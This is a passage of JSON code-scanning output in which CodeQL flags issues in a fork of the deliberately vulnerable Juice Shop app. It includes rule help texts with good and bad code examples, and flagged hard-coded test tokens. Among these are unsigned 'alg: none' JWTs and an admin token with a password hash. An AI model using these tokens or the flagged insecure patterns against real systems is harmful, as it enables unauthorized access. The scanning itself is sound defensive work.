express();\napp.use(require('body-parser').urlencoded({ extended: false }))\n\n// bad: sensitive information is read from query parameters\napp.get('/login1', (req, res) => {\n    const user = req.query.user;\n    const password = req.query.password;\n    if (checkUser(user, password)) {\n        res.send('Welcome');\n    } else {\n        res.send('Access denied');\n    }\n});\n\n// good: sensitive information is read from post body\napp.post('/login2', (req, res) => {\n    const user = req.body.user;\n    const password = req.body.password;\n    if (checkUser(user, password)) {\n        res.send('Welcome');\n    } else {\n        res.send('Access denied');\n    }\n});\n\n```\n\n## References\n* CWE: [CWE-598: Use of GET Request Method with Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)\n* PortSwigger (Burp): [Password Submitted using GET Method](https://portswigger.net/kb/issues/00400300_password-submitted-using-get-method)\n* OWASP: [Information Exposure through Query Strings in URL](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url)\n* Common Weakness Enumeration: [CWE-598](https://cwe.mitre.org/data/definitions/598.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Route handler for GET requests uses query parameter as sensitive data."},"location":{"path":"routes/changePassword.ts","start_line":16,"end_line":16,"start_column":29,"end_column":42},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/87/instances","dismissal_approved_by":null},{"number":86,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-02-05T02:32:44Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/86","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/86","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/hardcoded-credentials","severity":"warning","description":"Hard-coded credentials","name":"js/hardcoded-credentials","tags":["external/cwe/cwe-259","external/cwe/cwe-321","external/cwe/cwe-798","security"],"full_description":"Hard-coding credentials in source code may enable an attacker to gain unauthorized access.","help":"# Hard-coded credentials\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\nIf the credentials are a placeholder value, make sure the value is obviously a placeholder by using a name such as `\"SampleToken\"` or `\"MyPassword\"`.\n\n\n## Example\nThe following code example connects to an HTTP request using an hard-codes authentication header:\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = 'user';\nlet password = 'passwd';\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n          method:'GET',\n          headers: headers\n       })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\nInstead, user name and password can be supplied through the environment variables `username` and `password`, which can be set externally without hard-coding credentials in the source code.\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = process.env.USERNAME;\nlet password = process.env.PASSWORD;\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n        method:'GET',\n        headers: headers\n     })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\n\n## Example\nThe following code example connects to a Postgres database using the `pg` package and hard-codes user name and password:\n\n\n```javascript\nconst pg = require(\"pg\");\n\nconst client = new pg.Client({\n  user: \"bob\",\n  host: \"database.server.com\",\n  database: \"mydb\",\n  password: \"correct-horse-battery-staple\",\n  port: 3211\n});\nclient.connect();\n\n```\nInstead, user name and password can be supplied through the environment variables `PGUSER` and `PGPASSWORD`, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The hard-coded value \"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImVtYWlsIjoicnNhX2xvcmRAIn0sImlhdCI6MTU4MjIyMTY3NX0.50f6VAIQk2Uzpf3sgH-1JVrrTuwudonm2DKn2ec7Tg8\" is used as authorization header."},"location":{"path":"test/server/verifySpec.ts","start_line":309,"end_line":309,"start_column":40,"end_column":193},"classifications":["test"]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/86/instances","dismissal_approved_by":null},{"number":85,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/85","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/85","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/hardcoded-credentials","severity":"warning","description":"Hard-coded credentials","name":"js/hardcoded-credentials","tags":["external/cwe/cwe-259","external/cwe/cwe-321","external/cwe/cwe-798","security"],"full_description":"Hard-coding credentials in source code may enable an attacker to gain unauthorized access.","help":"# Hard-coded credentials\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\nIf the credentials are a placeholder value, make sure the value is obviously a placeholder by using a name such as `\"SampleToken\"` or `\"MyPassword\"`.\n\n\n## Example\nThe following code example connects to an HTTP request using an hard-codes authentication header:\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = 'user';\nlet password = 'passwd';\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n          method:'GET',\n          headers: headers\n       })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\nInstead, user name and password can be supplied through the environment variables `username` and `password`, which can be set externally without hard-coding credentials in the source code.\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = process.env.USERNAME;\nlet password = process.env.PASSWORD;\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n        method:'GET',\n        headers: headers\n     })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\n\n## Example\nThe following code example connects to a Postgres database using the `pg` package and hard-codes user name and password:\n\n\n```javascript\nconst pg = require(\"pg\");\n\nconst client = new pg.Client({\n  user: \"bob\",\n  host: \"database.server.com\",\n  database: \"mydb\",\n  password: \"correct-horse-battery-staple\",\n  port: 3211\n});\nclient.connect();\n\n```\nInstead, user name and password can be supplied through the environment variables `PGUSER` and `PGPASSWORD`, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The hard-coded value \"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImVtYWlsIjoicnNhX2xvcmRAanVpY2Utc2gub3AifSwiaWF0IjoxNTgyMjIxNTc1fQ.ycFwtqh4ht4Pq9K5rhiPPY256F9YCTIecd4FHFuSEAg\" is used as authorization header."},"location":{"path":"test/server/verifySpec.ts","start_line":297,"end_line":297,"start_column":40,"end_column":208},"classifications":["test"]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/85/instances","dismissal_approved_by":null},{"number":84,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/84","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/84","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/hardcoded-credentials","severity":"warning","description":"Hard-coded credentials","name":"js/hardcoded-credentials","tags":["external/cwe/cwe-259","external/cwe/cwe-321","external/cwe/cwe-798","security"],"full_description":"Hard-coding credentials in source code may enable an attacker to gain unauthorized access.","help":"# Hard-coded credentials\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\nIf the credentials are a placeholder value, make sure the value is obviously a placeholder by using a name such as `\"SampleToken\"` or `\"MyPassword\"`.\n\n\n## Example\nThe following code example connects to an HTTP request using an hard-codes authentication header:\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = 'user';\nlet password = 'passwd';\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n          method:'GET',\n          headers: headers\n       })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\nInstead, user name and password can be supplied through the environment variables `username` and `password`, which can be set externally without hard-coding credentials in the source code.\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = process.env.USERNAME;\nlet password = process.env.PASSWORD;\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n        method:'GET',\n        headers: headers\n     })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\n\n## Example\nThe following code example connects to a Postgres database using the `pg` package and hard-codes user name and password:\n\n\n```javascript\nconst pg = require(\"pg\");\n\nconst client = new pg.Client({\n  user: \"bob\",\n  host: \"database.server.com\",\n  database: \"mydb\",\n  password: \"correct-horse-battery-staple\",\n  port: 3211\n});\nclient.connect();\n\n```\nInstead, user name and password can be supplied through the environment variables `PGUSER` and `PGPASSWORD`, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The hard-coded value \"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJkYXRhIjp7ImVtYWlsIjoiand0bjNkQCJ9LCJpYXQiOjE1MDg2Mzk2MTIsImV4cCI6OTk5OTk5OTk5OX0.\" is used as authorization header."},"location":{"path":"test/server/verifySpec.ts","start_line":275,"end_line":275,"start_column":38,"end_column":167},"classifications":["test"]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/84/instances","dismissal_approved_by":null},{"number":83,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/83","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/83","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/hardcoded-credentials","severity":"warning","description":"Hard-coded credentials","name":"js/hardcoded-credentials","tags":["external/cwe/cwe-259","external/cwe/cwe-321","external/cwe/cwe-798","security"],"full_description":"Hard-coding credentials in source code may enable an attacker to gain unauthorized access.","help":"# Hard-coded credentials\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\nIf the credentials are a placeholder value, make sure the value is obviously a placeholder by using a name such as `\"SampleToken\"` or `\"MyPassword\"`.\n\n\n## Example\nThe following code example connects to an HTTP request using an hard-codes authentication header:\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = 'user';\nlet password = 'passwd';\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n          method:'GET',\n          headers: headers\n       })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\nInstead, user name and password can be supplied through the environment variables `username` and `password`, which can be set externally without hard-coding credentials in the source code.\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = process.env.USERNAME;\nlet password = process.env.PASSWORD;\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n        method:'GET',\n        headers: headers\n     })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\n\n## Example\nThe following code example connects to a Postgres database using the `pg` package and hard-codes user name and password:\n\n\n```javascript\nconst pg = require(\"pg\");\n\nconst client = new pg.Client({\n  user: \"bob\",\n  host: \"database.server.com\",\n  database: \"mydb\",\n  password: \"correct-horse-battery-staple\",\n  port: 3211\n});\nclient.connect();\n\n```\nInstead, user name and password can be supplied through the environment variables `PGUSER` and `PGPASSWORD`, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The hard-coded value \"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJkYXRhIjp7ImVtYWlsIjoiand0bjNkQGp1aWNlLXNoLm9wIn0sImlhdCI6MTUwODYzOTYxMiwiZXhwIjo5OTk5OTk5OTk5fQ.\" is used as authorization header."},"location":{"path":"test/server/verifySpec.ts","start_line":263,"end_line":263,"start_column":38,"end_column":182},"classifications":["test"]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/83/instances","dismissal_approved_by":null},{"number":82,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/82","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/82","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/hardcoded-credentials","severity":"warning","description":"Hard-coded credentials","name":"js/hardcoded-credentials","tags":["external/cwe/cwe-259","external/cwe/cwe-321","external/cwe/cwe-798","security"],"full_description":"Hard-coding credentials in source code may enable an attacker to gain unauthorized access.","help":"# Hard-coded credentials\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\nIf the credentials are a placeholder value, make sure the value is obviously a placeholder by using a name such as `\"SampleToken\"` or `\"MyPassword\"`.\n\n\n## Example\nThe following code example connects to an HTTP request using an hard-codes authentication header:\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = 'user';\nlet password = 'passwd';\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n          method:'GET',\n          headers: headers\n       })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\nInstead, user name and password can be supplied through the environment variables `username` and `password`, which can be set externally without hard-coding credentials in the source code.\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = process.env.USERNAME;\nlet password = process.env.PASSWORD;\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n        method:'GET',\n        headers: headers\n     })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\n\n## Example\nThe following code example connects to a Postgres database using the `pg` package and hard-codes user name and password:\n\n\n```javascript\nconst pg = require(\"pg\");\n\nconst client = new pg.Client({\n  user: \"bob\",\n  host: \"database.server.com\",\n  database: \"mydb\",\n  password: \"correct-horse-battery-staple\",\n  port: 3211\n});\nclient.connect();\n\n```\nInstead, user name and password can be supplied through the environment variables `PGUSER` and `PGPASSWORD`, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The hard-coded value \"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6ImRlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDE5LTA4LTE5IDE1OjU2OjE1LjYyOSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDE5LTA4LTE5IDE1OjU2OjE1LjYyOSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE1NjYyMzAyMjQsImV4cCI6MTU2NjI0ODIyNH0.FL0kkcInY5sDMGKeLHfEOYDTQd3BjR6_mK7Tcm_RH6iCLotTSRRoRxHpLkbtIQKqBFIt14J4BpLapkzG7ppRWcEley5nego-4iFOmXQvCBz5ISS3HdtM0saJnOe0agyVUen3huFp4F2UCth_y2ScjMn_4AgW66cz8NSFPRVpC8g\" is used as authorization header."},"location":{"path":"test/api/userApiSpec.ts","start_line":300,"end_line":300,"start_column":78,"end_column":776},"classifications":["test"]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/82/instances","dismissal_approved_by":null},{"number":81,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/81","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/81","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/hardcoded-credentials","severity":"warning","description":"Hard-coded credentials","name":"js/hardcoded-credentials","tags":["external/cwe/cwe-259","external/cwe/cwe-321","external/cwe/cwe-798","security"],"full_description":"Hard-coding credentials in source code may enable an attacker to gain unauthorized access.","help":"# Hard-coded credentials\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\nIf the credentials are a placeholder value, make sure the value is obviously a placeholder by using a name such as `\"SampleToken\"` or `\"MyPassword\"`.\n\n\n## Example\nThe following code example connects to an HTTP request using an hard-codes authentication header:\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = 'user';\nlet password = 'passwd';\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n          method:'GET',\n          headers: headers\n       })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\nInstead, user name and password can be supplied through the environment variables `username` and `password`, which can be set externally without hard-coding credentials in the source code.\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = process.env.USERNAME;\nlet password = process.env.PASSWORD;\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n        method:'GET',\n        headers: headers\n     })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\n\n## Example\nThe following code example connects to a Postgres database using the `pg` package and hard-codes user name and password:\n\n\n```javascript\nconst pg = require(\"pg\");\n\nconst client = new pg.Client({\n  user: \"bob\",\n  host: \"database.server.com\",\n  database: \"mydb\",\n  password: \"correct-horse-battery-staple\",\n  port: 3211\n});\nclient.connect();\n\n```\nInstead, user name and password can be supplied through the environment variables `PGUSER` and `PGPASSWORD`, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The hard-coded value \"BoarBeatsBear\" is used as authorization header."},"location":{"path":"test/api/userApiSpec.ts","start_line":291,"end_line":291,"start_column":78,"end_column":93},"classifications":["test"]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/81/instances","dismissal_approved_by":null},{"number":80,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/80","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/80","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/hardcoded-credentials","severity":"warning","description":"Hard-coded credentials","name":"js/hardcoded-credentials","tags":["external/cwe/cwe-259","external/cwe/cwe-321","external/cwe/cwe-798","security"],"full_description":"Hard-coding credentials in source code may enable an attacker to gain unauthorized access.","help":"# Hard-coded credentials\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\nIf the credentials are a placeholder value, make sure the value is obviously a placeholder by using a name such as `\"SampleToken\"` or `\"MyPassword\"`.\n\n\n## Example\nThe following code example connects to an HTTP request using an hard-codes authentication header:\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = 'user';\nlet password = 'passwd';\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n          method:'GET',\n          headers: headers\n       })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\nInstead, user name and password can be supplied through the environment variables `username` and `password`, which can be set externally without hard-coding credentials in the source code.\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = process.env.USERNAME;\nlet password = process.env.PASSWORD;\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n        method:'GET',\n        headers: headers\n     })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\n\n## Example\nThe following code example connects to a Postgres database using the `pg` package and hard-codes user name and password:\n\n\n```javascript\nconst pg = require(\"pg\");\n\nconst client = new pg.Client({\n  user: \"bob\",\n  host: \"database.server.com\",\n  database: \"mydb\",\n  password: \"correct-horse-battery-staple\",\n  port: 3211\n});\nclient.connect();\n\n```\nInstead, user name and password can be supplied through the environment variables `PGUSER` and `PGPASSWORD`, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The hard-coded value \"Bearer unknown\" is used as authorization 